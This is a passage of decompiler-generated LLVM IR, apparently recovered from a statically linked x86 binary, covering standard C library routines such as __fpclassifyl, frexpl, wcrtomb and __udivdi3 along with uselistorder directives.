  uselistorder label %dec_label_pc_8053598, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053580, { 1, 0 }
}

define i32 @strerror() local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @dummy.10(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__lctrans(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_80535d5 = call i32 @dummy.10(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  ret i32 %v2_80535d5

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 43, 44, 45, 46, 41, 37, 38, 39, 40, 42, 33, 34, 35, 36, 47, 31, 32, 48, 49, 50, 51, 52, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 53, 54, 55, 56, 57, 58 }
}

define i32 @__lctrans_cur(i32 %arg1) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @__fpclassifyl() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call x86_fp80 @__decompiler_undefined_function_7()
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v15_8053600 = ptrtoint i32* %stack_var_-28 to i32
  store i1 false, i1* @df, align 1
  %v6_8053606 = add i32 %v15_8053600, 4
  store i32 %v6_8053606, i32* %edi.global-to-local, align 4
  %v2_8053607 = inttoptr i32 %v6_8053606 to i32*
  store i32 0, i32* %v2_8053607, align 4
  %v3_8053607 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053607 = add i32 %v3_8053607, 4
  %v0_8053608 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053608 = inttoptr i32 %v6_8053607 to i32*
  store i32 %v0_8053608, i32* %v2_8053608, align 4
  %v4_805360d = fptrunc x86_fp80 %tmp4 to float
  %v5_805360d = bitcast float %v4_805360d to i32
  store i32 %v5_805360d, i32* %stack_var_-28, align 4
  %tmp9 = icmp slt i32 %tmp3, 0
  %v2_8053622 = zext i1 %tmp9 to i32
  %tmp10 = urem i16 %tmp, -32768
  %v1_8053625 = zext i16 %tmp10 to i32
  store i32 %v1_8053625, i32* %edi.global-to-local, align 4
  %v2_805362f = or i32 %v1_8053625, %v2_8053622
  %v3_805362f = icmp eq i32 %v2_805362f, 0
  store i32 %v2_805362f, i32* %eax.global-to-local, align 4
  %v1_8053631 = icmp eq i1 %v3_805362f, false
  br i1 %v1_8053631, label %dec_label_pc_8053641, label %dec_label_pc_8053633

dec_label_pc_8053633:                             ; preds = %entry
  %v2_8053635 = or i32 %v5_805360d, %tmp3
  %v3_8053635 = icmp eq i32 %v2_8053635, 0
  %v1_805363c = select i1 %v3_8053635, i32 4, i32 3
  store i32 %v1_805363c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805365d

dec_label_pc_8053641:                             ; preds = %entry
  %v3_8053622 = icmp eq i1 %tmp9, false
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v3_8053622, label %dec_label_pc_805365d, label %dec_label_pc_8053647

dec_label_pc_8053647:                             ; preds = %dec_label_pc_8053641
  %v9_8053647 = icmp eq i16 %tmp10, 32767
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_805364f = icmp eq i1 %v9_8053647, false
  br i1 %v1_805364f, label %dec_label_pc_805365d, label %dec_label_pc_8053651

dec_label_pc_8053651:                             ; preds = %dec_label_pc_8053647
  %v2_8053651 = mul i32 %v5_805360d, 2
  %v7_8053651 = icmp ult i32 %v2_8053651, %v5_805360d
  %v3_8053653 = zext i1 %v7_8053651 to i32
  %v4_8053653 = mul i32 %tmp3, 2
  %v5_8053653 = or i32 %v3_8053653, %v4_8053653
  %v2_8053655 = or i32 %v5_8053653, %v2_8053651
  %v3_8053655 = icmp eq i32 %v2_8053655, 0
  %v1_8053657 = zext i1 %v3_8053655 to i32
  store i32 %v1_8053657, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805365d

dec_label_pc_805365d:                             ; preds = %dec_label_pc_8053647, %dec_label_pc_8053641, %dec_label_pc_8053633, %dec_label_pc_8053651
  %v0_8053662 = phi i32 [ 4, %dec_label_pc_8053647 ], [ 0, %dec_label_pc_8053641 ], [ %v1_805363c, %dec_label_pc_8053633 ], [ %v1_8053657, %dec_label_pc_8053651 ]
  ret i32 %v0_8053662

; uselistorder directives
  uselistorder i32 %v2_8053651, { 1, 0 }
  uselistorder i32 %v5_805360d, { 2, 0, 1, 3 }
  uselistorder i32 %tmp3, { 0, 2, 1 }
  uselistorder i32 2, { 16, 17, 100, 18, 101, 102, 103, 104, 99, 140, 141, 142, 143, 19, 144, 145, 77, 120, 121, 122, 50, 20, 123, 124, 125, 48, 0, 52, 126, 51, 21, 22, 23, 24, 1, 60, 2, 116, 117, 25, 78, 91, 107, 3, 61, 79, 92, 4, 127, 55, 109, 110, 26, 128, 129, 27, 28, 56, 29, 30, 62, 63, 31, 49, 130, 131, 132, 133, 32, 33, 111, 134, 64, 118, 80, 93, 81, 94, 57, 82, 95, 119, 34, 135, 68, 70, 69, 71, 72, 35, 67, 74, 73, 58, 66, 75, 137, 138, 65, 5, 139, 12, 8, 9, 7, 10, 6, 96, 11, 97, 108, 53, 13, 105, 106, 54, 36, 59, 136, 37, 38, 39, 40, 41, 42, 43, 44, 45, 14, 76, 112, 46, 113, 83, 114, 115, 84, 85, 98, 86, 15, 87, 88, 47, 90, 89 }
  uselistorder i32 3, { 18, 29, 30, 27, 10, 42, 43, 44, 8, 0, 1, 12, 34, 19, 28, 3, 2, 33, 4, 13, 35, 20, 45, 15, 36, 37, 46, 5, 11, 21, 25, 14, 22, 26, 38, 16, 17, 6, 7, 31, 39, 40, 23, 32, 24, 41, 47, 9 }
  uselistorder label %dec_label_pc_805365d, { 3, 0, 1, 2 }
}

define i32 @__signbitl() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_3()
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v15_8053667 = ptrtoint i32* %stack_var_-28 to i32
  %v6_805366d = add i32 %v15_8053667, 4
  store i32 %v6_805366d, i32* %edi.global-to-local, align 4
  %v2_805366e = inttoptr i32 %v6_805366d to i32*
  store i32 0, i32* %v2_805366e, align 4
  %v3_805366e = load i32, i32* %edi.global-to-local, align 4
  %v6_805366e = add i32 %v3_805366e, 4
  %v0_805366f = load i32, i32* %eax.global-to-local, align 4
  %v2_805366f = inttoptr i32 %v6_805366e to i32*
  store i32 %v0_805366f, i32* %v2_805366f, align 4
  %v3_805367f = lshr i16 %tmp, 15
  %v6_805367f = zext i16 %v3_805367f to i32
  store i32 %v6_805367f, i32* %eax.global-to-local, align 4
  ret i32 %v6_805367f
}

define i32 @frexpl(x86_fp80 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-28 = alloca x86_fp80, align 4
  %v0_8053688 = load i32, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805368b = load i32, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %arg2, i32* @ebx, align 4
  %v2_8053694 = ptrtoint x86_fp80* %stack_var_-28 to i32
  %v10_8053698 = add i32 %v2_8053694, 4
  store i32 %v10_8053698, i32* %edi.global-to-local, align 4
  %v2_8053699 = inttoptr i32 %v10_8053698 to i32*
  store i32 0, i32* %v2_8053699, align 4
  %v3_8053699 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053699 = add i32 %v3_8053699, 4
  store i32 %v6_8053699, i32* %edi.global-to-local, align 4
  %v0_805369a = load i32, i32* %eax.global-to-local, align 4
  %v2_805369a = inttoptr i32 %v6_8053699 to i32*
  store i32 %v0_805369a, i32* %v2_805369a, align 4
  %v3_805369a = load i32, i32* %edi.global-to-local, align 4
  %v6_805369a = add i32 %v3_805369a, 4
  store i32 %v6_805369a, i32* @edi, align 4
  %v4_805369b = load i3, i3* @fpu_stat_TOP, align 1
  store x86_fp80 %arg1, x86_fp80* %stack_var_-28, align 4
  %v4_80536a5 = sext i16 %tmp6 to i32
  store i32 %v4_80536a5, i32* @edx, align 4
  %v1_80536ab = urem i32 %v4_80536a5, 32768
  %v2_80536ab = icmp eq i32 %v1_80536ab, 0
  store i32 %v1_80536ab, i32* %eax.global-to-local, align 4
  %v1_80536b0 = icmp eq i1 %v2_80536ab, false
  br i1 %v1_80536b0, label %dec_label_pc_80536f2, label %dec_label_pc_80536b2

dec_label_pc_80536b2:                             ; preds = %entry
  %v1_80536bc = udiv i32 %v1_80536ab, 256
  %tmp18 = and i32 %v1_80536bc, 68
  %tmp19 = icmp eq i32 %tmp18, 64
  br i1 %tmp19, label %dec_label_pc_80536e8, label %dec_label_pc_80536c1

dec_label_pc_80536c1:                             ; preds = %dec_label_pc_80536b2
  store i3 %v4_805369b, i3* @fpu_stat_TOP, align 1
  %v0_80536ca = load i32, i32* @ebx, align 4
  %v7_80536d7 = call i32 @frexpl(x86_fp80 0xK00000000000000000000, i32 %tmp, i32 %tmp5, i32 %v0_80536ca, i32 0)
  store i32 %v7_80536d7, i32* %eax.global-to-local, align 4
  %v0_80536dc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80536dc = inttoptr i32 %v0_80536dc to i32*
  %v2_80536dc = load i32, i32* %v1_80536dc, align 4
  %v3_80536dc = add i32 %v2_80536dc, -120
  store i32 %v3_80536dc, i32* %v1_80536dc, align 4
  %v0_80536df = load i3, i3* @fpu_stat_TOP, align 1
  %v1_80536df = load x86_fp80, x86_fp80* @st0, align 4
  %v5_80536df = add i3 %v0_80536df, 1
  br label %dec_label_pc_8053719

dec_label_pc_80536e8:                             ; preds = %dec_label_pc_80536b2
  %v0_80536ea = load i32, i32* @ebx, align 4
  %v1_80536ea = inttoptr i32 %v0_80536ea to i32*
  store i32 0, i32* %v1_80536ea, align 4
  br label %dec_label_pc_8053719

dec_label_pc_80536f2:                             ; preds = %entry
  %v9_80536f4 = icmp eq i32 %v1_80536ab, 32767
  br i1 %v9_80536f4, label %dec_label_pc_8053719, label %dec_label_pc_80536fb

dec_label_pc_80536fb:                             ; preds = %dec_label_pc_80536f2
  %v2_80536fb = and i16 %tmp6, -32768
  %v1_8053700 = add nsw i32 %v1_80536ab, -16382
  store i32 %v1_8053700, i32* %eax.global-to-local, align 4
  %v2_8053705 = or i16 %v2_80536fb, 16382
  %v8_8053705 = zext i16 %v2_8053705 to i32
  %v10_8053705 = and i32 %v4_80536a5, -65536
  %v11_8053705 = or i32 %v8_8053705, %v10_8053705
  store i32 %v11_8053705, i32* @edx, align 4
  %v1_805370a = load i32, i32* @ebx, align 4
  %v2_805370a = inttoptr i32 %v1_805370a to i32*
  store i32 %v1_8053700, i32* %v2_805370a, align 4
  %v3_8053711 = load x86_fp80, x86_fp80* %stack_var_-28, align 4
  br label %dec_label_pc_8053719

dec_label_pc_8053719:                             ; preds = %dec_label_pc_80536f2, %dec_label_pc_80536e8, %dec_label_pc_80536c1, %dec_label_pc_80536fb
  %v4_8053719 = phi i3 [ %v4_805369b, %dec_label_pc_80536f2 ], [ %v4_805369b, %dec_label_pc_80536fb ], [ %v5_80536df, %dec_label_pc_80536c1 ], [ %v4_805369b, %dec_label_pc_80536e8 ]
  %stack_var_4.0 = phi x86_fp80 [ %arg1, %dec_label_pc_80536f2 ], [ %v3_8053711, %dec_label_pc_80536fb ], [ %v1_80536df, %dec_label_pc_80536c1 ], [ %arg1, %dec_label_pc_80536e8 ]
  %v5_8053719 = add i3 %v4_8053719, -1
  store x86_fp80 %stack_var_4.0, x86_fp80* @st0, align 4
  store i3 %v5_8053719, i3* @fpu_stat_TOP, align 1
  store i32 %v0_805368b, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053688, i32* @edi, align 4
  %v0_8053722 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053722

; uselistorder directives
  uselistorder i32 %v1_80536ab, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v4_80536a5, { 1, 0, 2 }
  uselistorder x86_fp80* %stack_var_-28, { 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i3 -1, { 1, 0 }
  uselistorder i32 -65536, { 0, 1, 2, 4, 5, 3, 6, 7, 8 }
  uselistorder i16 -32768, { 3, 0, 1, 2 }
  uselistorder i3 1, { 1, 0 }
  uselistorder x86_fp80* @st0, { 1, 0, 2 }
  uselistorder i32 (x86_fp80, i32, i32, i32, i32)* @frexpl, { 1, 0 }
  uselistorder i32 64, { 0, 24, 1, 9, 2, 3, 13, 10, 11, 4, 14, 15, 16, 17, 18, 19, 12, 6, 7, 8, 21, 5, 20, 22, 23 }
  uselistorder i32 68, { 0, 9, 10, 11, 12, 13, 1, 2, 14, 15, 16, 3, 6, 7, 8, 17, 18, 19, 20, 23, 24, 25, 4, 21, 22, 5 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 46, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 39, 40, 41, 44, 36, 42, 37, 38, 43, 45 }
  uselistorder i3* @fpu_stat_TOP, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32 4, { 52, 53, 54, 55, 139, 125, 126, 140, 56, 141, 333, 335, 334, 336, 337, 156, 157, 158, 159, 160, 11, 154, 161, 12, 162, 163, 164, 13, 14, 15, 165, 166, 167, 168, 169, 170, 57, 58, 171, 59, 172, 173, 174, 153, 339, 340, 341, 342, 343, 344, 175, 338, 224, 132, 347, 155, 49, 227, 228, 231, 229, 230, 50, 16, 232, 233, 17, 349, 350, 198, 199, 200, 201, 202, 203, 204, 1, 225, 226, 0, 18, 19, 20, 351, 352, 21, 22, 23, 345, 184, 185, 186, 2, 219, 60, 187, 142, 176, 177, 178, 179, 3, 127, 234, 235, 128, 236, 237, 238, 239, 240, 131, 241, 242, 61, 243, 244, 245, 246, 247, 248, 129, 355, 353, 354, 143, 180, 356, 249, 348, 220, 250, 251, 252, 253, 254, 255, 24, 25, 357, 26, 28, 27, 29, 30, 358, 4, 256, 5, 31, 32, 257, 264, 33, 273, 274, 262, 34, 263, 271, 272, 267, 268, 269, 270, 265, 266, 258, 259, 260, 261, 214, 275, 276, 277, 278, 279, 221, 222, 188, 189, 359, 360, 361, 362, 363, 6, 280, 35, 281, 282, 283, 284, 285, 286, 36, 144, 287, 288, 289, 290, 68, 65, 291, 66, 292, 293, 294, 295, 62, 63, 64, 296, 67, 69, 70, 71, 72, 73, 74, 145, 88, 89, 90, 91, 92, 93, 94, 298, 130, 148, 299, 300, 95, 96, 97, 134, 301, 135, 136, 137, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 146, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 147, 181, 133, 182, 183, 7, 297, 216, 8, 302, 303, 111, 112, 113, 149, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 37, 51, 190, 10, 38, 191, 192, 193, 194, 195, 196, 197, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 138, 327, 329, 331, 332, 328, 330, 364, 114, 115, 116, 117, 118, 365, 366, 367, 368, 369, 121, 120, 122, 119, 123, 205, 39, 40, 41, 42, 43, 206, 207, 44, 208, 150, 151, 152, 124, 209, 210, 211, 212, 9, 213, 45, 215, 218, 217, 223, 46, 47, 48, 370, 371, 346 }
  uselistorder i1* @df, { 0, 1, 13, 2, 3, 4, 14, 15, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* @ebx, { 118, 119, 120, 121, 122, 525, 529, 530, 531, 532, 533, 534, 535, 536, 12, 537, 538, 539, 540, 13, 14, 541, 564, 542, 7, 91, 543, 544, 545, 546, 550, 551, 552, 15, 59, 60, 61, 62, 63, 64, 66, 65, 1, 67, 68, 69, 70, 71, 4, 72, 73, 74, 75, 76, 5, 6, 77, 78, 79, 80, 81, 82, 83, 84, 85, 88, 86, 87, 89, 90, 93, 92, 94, 95, 96, 553, 554, 555, 556, 557, 558, 560, 561, 547, 548, 549, 559, 100, 101, 265, 266, 572, 52, 573, 50, 585, 574, 16, 17, 575, 576, 267, 268, 269, 270, 271, 272, 277, 278, 18, 279, 280, 586, 587, 588, 589, 590, 591, 592, 19, 593, 594, 595, 596, 597, 153, 154, 155, 156, 157, 159, 158, 160, 161, 162, 163, 598, 599, 102, 565, 566, 0, 567, 219, 220, 221, 222, 223, 224, 281, 282, 283, 284, 123, 124, 125, 126, 127, 526, 527, 528, 225, 2, 226, 227, 228, 229, 230, 231, 232, 233, 600, 601, 103, 104, 105, 20, 106, 107, 602, 603, 604, 605, 609, 610, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 611, 612, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 613, 614, 615, 616, 617, 618, 619, 620, 164, 165, 166, 167, 168, 215, 216, 217, 108, 109, 110, 111, 606, 607, 608, 577, 578, 579, 580, 581, 21, 582, 583, 584, 234, 235, 236, 237, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 318, 319, 22, 320, 321, 322, 323, 324, 325, 326, 23, 327, 328, 273, 274, 275, 276, 621, 622, 623, 624, 329, 330, 331, 332, 625, 626, 627, 628, 629, 211, 212, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 361, 362, 346, 347, 348, 349, 350, 351, 352, 24, 353, 354, 357, 358, 359, 360, 355, 356, 344, 345, 25, 179, 562, 563, 180, 181, 182, 183, 238, 239, 26, 240, 241, 363, 364, 365, 366, 367, 27, 368, 369, 242, 53, 243, 244, 28, 51, 245, 246, 184, 29, 185, 186, 247, 248, 249, 250, 251, 30, 31, 32, 252, 253, 33, 254, 255, 128, 129, 130, 131, 132, 370, 34, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 630, 631, 632, 633, 634, 638, 635, 636, 637, 639, 640, 641, 642, 643, 644, 262, 263, 264, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 3, 35, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 36, 414, 415, 416, 417, 37, 57, 418, 419, 420, 54, 423, 424, 425, 56, 38, 9, 39, 426, 427, 428, 429, 430, 40, 431, 432, 433, 440, 441, 41, 8, 55, 442, 443, 444, 445, 446, 448, 449, 450, 447, 451, 421, 422, 112, 113, 114, 115, 116, 117, 434, 435, 42, 436, 43, 437, 438, 439, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 97, 463, 98, 99, 464, 465, 466, 467, 523, 524, 490, 491, 492, 135, 136, 137, 468, 469, 470, 133, 134, 138, 139, 140, 44, 141, 142, 143, 144, 145, 146, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 493, 494, 495, 496, 497, 498, 499, 518, 519, 520, 45, 521, 522, 500, 501, 502, 503, 504, 505, 506, 46, 507, 508, 509, 510, 511, 512, 513, 514, 515, 47, 516, 517, 147, 49, 148, 149, 150, 48, 151, 152, 645, 646, 648, 647, 10, 649, 650, 58, 651, 11, 652, 653, 654, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 213, 214, 218, 256, 257, 258, 259, 260, 261, 568, 569, 570, 571 }
  uselistorder i32* @edi, {}
  uselistorder label %dec_label_pc_8053719, { 3, 0, 1, 2 }
}

define i32 @wctomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v1_805372d = icmp eq i32 %tmp3, 0
  br i1 %v1_805372d, label %dec_label_pc_8053741, label %dec_label_pc_8053731

dec_label_pc_8053731:                             ; preds = %entry
  %v4_8053739 = inttoptr i32 %tmp3 to i8*
  %v5_8053739 = call i32 @wcrtomb(i8* %v4_8053739, i32 %tmp, i32 0, i32 0)
  br label %dec_label_pc_8053741

dec_label_pc_8053741:                             ; preds = %entry, %dec_label_pc_8053731
  %v0_8053744 = phi i32 [ 0, %entry ], [ %v5_8053739, %dec_label_pc_8053731 ]
  ret i32 %v0_8053744

; uselistorder directives
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_8053741, { 1, 0 }
}

define i32 @wcrtomb(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v4_8053750 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053750, i32* @ecx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8053754 = sdiv i32 %sext, 16777216
  %v2_8053758 = icmp eq i8* %arg1, null
  br i1 %v2_8053758, label %dec_label_pc_8053852, label %dec_label_pc_8053760

dec_label_pc_8053760:                             ; preds = %entry
  %v7_8053763 = icmp ugt i32 %v4_8053754, 127
  br i1 %v7_8053763, label %dec_label_pc_805376c, label %dec_label_pc_8053765

dec_label_pc_8053765:                             ; preds = %dec_label_pc_8053760
  %v1_8053765 = trunc i32 %v4_8053754 to i8
  store i8 %v1_8053765, i8* %arg1, align 1
  %v0_8053855.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053852

dec_label_pc_805376c:                             ; preds = %dec_label_pc_8053760
  call void @llvm.trap()
  unreachable

dec_label_pc_8053852:                             ; preds = %entry, %dec_label_pc_8053765
  %v0_8053855 = phi i32 [ 1, %entry ], [ %v0_8053855.pre, %dec_label_pc_8053765 ]
  ret i32 %v0_8053855

; uselistorder directives
  uselistorder i32 %v4_8053754, { 1, 0 }
  uselistorder i32 127, { 1, 2, 3, 0 }
  uselistorder i8* null, { 10, 2, 11, 12, 13, 6, 4, 5, 3, 14, 9, 7, 8, 1, 15, 0, 17, 16, 18 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 12, 13, 14, 16, 15, 18, 17, 20, 19, 22, 21, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33 }
  uselistorder i8* %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053852, { 1, 0 }
}

define i64 @__udivdi3(i64 %n, i64 %d) local_unnamed_addr {
entry:
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = call i64 @__decompiler_undefined_function_2()
  %v4_8053876 = trunc i64 %tmp43 to i32
  %v4_8053883 = trunc i64 %n to i32
  %v5_805388620 = and i64 %n, 4294967295
  %v4_8053889 = trunc i64 %d to i32
  %v2_805388c = icmp eq i32 %tmp42, 0
  %v1_805388e = icmp eq i1 %v2_805388c, false
  br i1 %v1_805388e, label %dec_label_pc_80538c0, label %dec_label_pc_8053890

dec_label_pc_8053890:                             ; preds = %entry
  %tmp = icmp ugt i32 %v4_8053876, %v4_8053889
  br i1 %tmp, label %dec_label_pc_8053894, label %dec_label_pc_80538f0

dec_label_pc_8053894:                             ; preds = %dec_label_pc_8053890
  %v4_8053896 = mul i64 %d, 4294967296
  %v6_8053896 = or i64 %v4_8053896, %v5_805388620
  %v7_8053896 = and i64 %tmp43, 4294967295
  %v8_8053896 = udiv i64 %v6_8053896, %v7_8053896
  %v9_8053896 = trunc i64 %v8_8053896 to i32
  store i32 %v9_8053896, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_80538a0:                             ; preds = %dec_label_pc_80539a0, %dec_label_pc_8053980, %dec_label_pc_8053973, %dec_label_pc_8053903, %dec_label_pc_80538e3, %dec_label_pc_8053894
  %v0_80538a3 = phi i32 [ 0, %dec_label_pc_80539a0 ], [ 0, %dec_label_pc_8053980 ], [ 0, %dec_label_pc_8053973 ], [ %v9_8053907, %dec_label_pc_8053903 ], [ 0, %dec_label_pc_80538e3 ], [ 0, %dec_label_pc_8053894 ]
  %v0_80538a0 = phi i32 [ %v1_80539a3, %dec_label_pc_80539a0 ], [ 0, %dec_label_pc_8053980 ], [ %v13_805395f, %dec_label_pc_8053973 ], [ %v9_805390e, %dec_label_pc_8053903 ], [ 1, %dec_label_pc_80538e3 ], [ %v9_8053896, %dec_label_pc_8053894 ]
  %v5_80538a0 = sext i32 %v0_80538a0 to i64
  store i32 %v0_80538a3, i32* @edx, align 4
  ret i64 %v5_80538a0

dec_label_pc_80538c0:                             ; preds = %entry
  %v10_80538c0 = icmp ult i32 %tmp42, %v4_8053889
  %v8_80538c2 = icmp ugt i32 %tmp42, %v4_8053889
  br i1 %v8_80538c2, label %dec_label_pc_8053980, label %dec_label_pc_80538c8

dec_label_pc_80538c8:                             ; preds = %dec_label_pc_80538c0
  %v3_80538c8 = call i32 @llvm.ctlz.i32(i32 %tmp42, i1 true)
  %v2_80538cb = icmp eq i32 %v3_80538c8, 0
  %v1_80538d1 = icmp eq i1 %v2_80538cb, false
  br i1 %v1_80538d1, label %dec_label_pc_8053920, label %dec_label_pc_80538d3

dec_label_pc_80538d3:                             ; preds = %dec_label_pc_80538c8
  br i1 %v10_80538c0, label %dec_label_pc_80538e3, label %dec_label_pc_80538d7

dec_label_pc_80538d7:                             ; preds = %dec_label_pc_80538d3
  %v8_80538dd = icmp ugt i32 %v4_8053876, %v4_8053883
  br i1 %v8_80538dd, label %dec_label_pc_8053980, label %dec_label_pc_80538e3

dec_label_pc_80538e3:                             ; preds = %dec_label_pc_80538d7, %dec_label_pc_80538d3
  store i32 1, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_80538f0:                             ; preds = %dec_label_pc_8053890
  %v1_80538f3 = icmp eq i32 %v4_8053876, 0
  %v1_80538f5 = icmp eq i1 %v1_80538f3, false
  br i1 %v1_80538f5, label %dec_label_pc_8053903, label %dec_label_pc_80538f7

dec_label_pc_80538f7:                             ; preds = %dec_label_pc_80538f0
  %tmp51 = icmp eq i32 %v4_8053876, 1
  %v13_80538fe = zext i1 %tmp51 to i32
  br label %dec_label_pc_8053903

dec_label_pc_8053903:                             ; preds = %dec_label_pc_80538f0, %dec_label_pc_80538f7
  %v0_805390e = phi i32 [ %v4_8053876, %dec_label_pc_80538f0 ], [ %v13_80538fe, %dec_label_pc_80538f7 ]
  %v2_8053907 = and i64 %d, 4294967295
  %v4_8053907 = zext i32 %tmp42 to i64
  %v5_8053907 = mul nuw i64 %v4_8053907, 4294967296
  %v6_8053907 = or i64 %v5_8053907, %v2_8053907
  %v7_8053907 = zext i32 %v0_805390e to i64
  %v8_8053907 = udiv i64 %v6_8053907, %v7_8053907
  %v9_8053907 = trunc i64 %v8_8053907 to i32
  %v10_8053907 = urem i64 %v6_8053907, %v7_8053907
  %v5_805390e = mul nuw i64 %v10_8053907, 4294967296
  %v6_805390e = or i64 %v5_805390e, %v5_805388620
  %v8_805390e = udiv i64 %v6_805390e, %v7_8053907
  %v9_805390e = trunc i64 %v8_805390e to i32
  store i32 %v9_805390e, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_8053920:                             ; preds = %dec_label_pc_80538c8
  %v6_8053925 = sub nsw i32 32, %v3_80538c8
  %v2_8053931 = urem i32 %v6_8053925, 32
  %v4_8053931 = icmp eq i32 %v2_8053931, 0
  br i1 %v4_8053931, label %bb57, label %bb

bb:                                               ; preds = %dec_label_pc_8053920
  %v5_8053931 = lshr i32 %v4_8053876, %v2_8053931
  br label %bb57

bb57:                                             ; preds = %bb, %dec_label_pc_8053920
  %v0_805393a.ph = phi i32 [ %v5_8053931, %bb ], [ %v4_8053876, %dec_label_pc_8053920 ]
  %v5_8053938 = shl i32 %tmp42, %v3_80538c8
  %v2_805393a = or i32 %v0_805393a.ph, %v5_8053938
  %v5_805393c = sext i32 %v2_805393a to i64
  %v5_8053942 = shl i32 %v4_8053876, %v3_80538c8
  %phitmp = zext i32 %v5_8053942 to i64
  br i1 %v4_8053931, label %bb61, label %bb58

bb58:                                             ; preds = %bb57
  %v5_805394a = lshr i32 %v4_8053883, %v2_8053931
  br label %bb61

bb61:                                             ; preds = %bb57, %bb58
  %v0_8053953 = phi i32 [ %v4_8053883, %bb57 ], [ %v5_805394a, %bb58 ]
  %v5_8053951 = shl i32 %v4_8053889, %v3_80538c8
  %v2_8053953 = or i32 %v5_8053951, %v0_8053953
  br i1 %v4_8053931, label %bb63, label %bb62

bb62:                                             ; preds = %bb61
  %v5_8053958 = lshr i32 %v4_8053889, %v2_8053931
  br label %bb63

bb63:                                             ; preds = %bb61, %bb62
  %v0_805395a = phi i32 [ %v4_8053889, %bb61 ], [ %v5_8053958, %bb62 ]
  %v6_805395f = zext i32 %v2_8053953 to i64
  %v8_805395f = zext i32 %v0_805395a to i64
  %v9_805395f = mul nuw i64 %v8_805395f, 4294967296
